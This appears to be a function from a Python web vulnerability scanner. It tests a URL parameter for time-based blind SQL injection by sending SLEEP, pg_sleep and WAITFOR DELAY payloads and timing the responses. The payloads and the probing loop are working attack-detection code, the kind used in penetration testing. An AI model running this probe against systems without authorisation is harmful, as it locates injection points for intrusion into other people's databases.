def scan_time_based(url, param):
    """Scans for time-based blind SQL injection."""
    print(f"{YELLOW}[*] Testing for Time-Based Blind SQLi on parameter: {param}{RESET}")
    
    # Payloads for different DBs to cause a 5-second delay
    time_payloads = [
        "' AND SLEEP(5)--",        # MySQL, MariaDB
        "' AND pg_sleep(5)--",      # PostgreSQL
        "'; WAITFOR DELAY '0:0:5'--" # SQL Server
    ]
    
    delay = 5  # seconds

    parts = urlparse(url)
    query_dict = parse_qs(parts.query)

    for payload in time_payloads:
        query_dict[param] = payload
        new_query = urlencode(query_dict, doseq=True)
        test_url = urlunparse(parts._replace(query=new_query))

        try:
            res = requests.get(test_url, timeout=15)
            # Check if response time is greater than our delay
            if res.elapsed.total_seconds() >= delay:
                print(f"{GREEN}[+] Vulnerable to Time-Based Blind SQLi!{RESET}")
                print(f"  Payload used: {payload}")
                print(f"  Response time: {res.elapsed.total_seconds():.2f}s")
                return True
        except requests.RequestException:
            # Timeouts are expected here, but we check the elapsed time
            pass 

    print(f"{RED}[-] Not vulnerable to Time-Based Blind SQLi.{RESET}")
    return False